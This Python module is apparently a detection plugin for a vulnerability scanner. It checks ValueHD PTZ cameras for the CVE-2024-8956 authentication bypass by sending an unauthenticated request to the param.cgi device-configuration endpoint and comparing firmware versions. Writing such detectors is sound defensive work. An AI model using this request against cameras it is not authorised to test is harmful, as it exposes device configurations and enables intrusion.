"""Agent Asteroid implementation for CVE-2024-8956"""

import datetime
import logging
import re

from packaging import version
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "ValueHD PTZ Camera Authentication Bypass"
VULNERABILITY_REFERENCE = "CVE-2024-8956"
VULNERABILITY_DESCRIPTION = (
    "ValueHD PTZ cameras contain an authentication bypass "
    "vulnerability in the param.cgi endpoint."
)
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)
DEVICE_CONF_PATH = "/cgi-bin/param.cgi?get_device_conf"


@exploits_registry.register
class VHDPTZAuthBypassExploit(webexploit.WebExploit):
    """
    CVE-2024-8956: ValueHD PTZ Camera Authentication Bypass
    """

    accept_request = definitions.Request(method="GET", path=DEVICE_CONF_PATH)
    check_requests = definitions.Request(method="GET", path=DEVICE_CONF_PATH)

    accept_pattern = [
        re.compile(r'versioninfo="SOC v\d+\.\d+\.\d+\s*[-\\s*ARM]?'),
    ]

    version_pattern = re.compile(r'versioninfo="SOC v(\d+\.\d+\.\d+)')

    vuln_ranges = [
        definitions.VulnRange(
            min=None,  # No minimum version
            max=version.Version("6.3.39"),  # Versions up to 6.3.39 are vulnerable
        )
    ]

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect authentication bypass vulnerability on a target."""
        vulnerabilities: list[definitions.Vulnerability] = []

        try:
            resp = self.session.get(
                f"{target.origin}{self.check_requests.path}",
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            if (
                self._is_vulnerable_version(resp.text) is True
                or resp.status_code == 200
            ):
                vulnerability = self.create_vulnerability(target)
                vulnerability.technical_detail += "\n- param.cgi?get_device_conf is accessible and exposes device configurations"
                vulnerabilities.append(vulnerability)
        except requests_exceptions.RequestException as e:
            logging.error("Authentication bypass detection failed: %s", e)

        return vulnerabilities

    def _is_vulnerable_version(self, response_text: str) -> bool:
        """Check if the target is running a vulnerable version."""
        if (matched := self.version_pattern.findall(response_text)) is not None:
            for extracted_version in matched:
                for r in self.vuln_ranges:
                    if (
                        r.min is None or r.min <= version.Version(extracted_version)
                    ) and (
                        r.max is None or r.max >= version.Version(extracted_version)
                    ):
                        return True
        return False
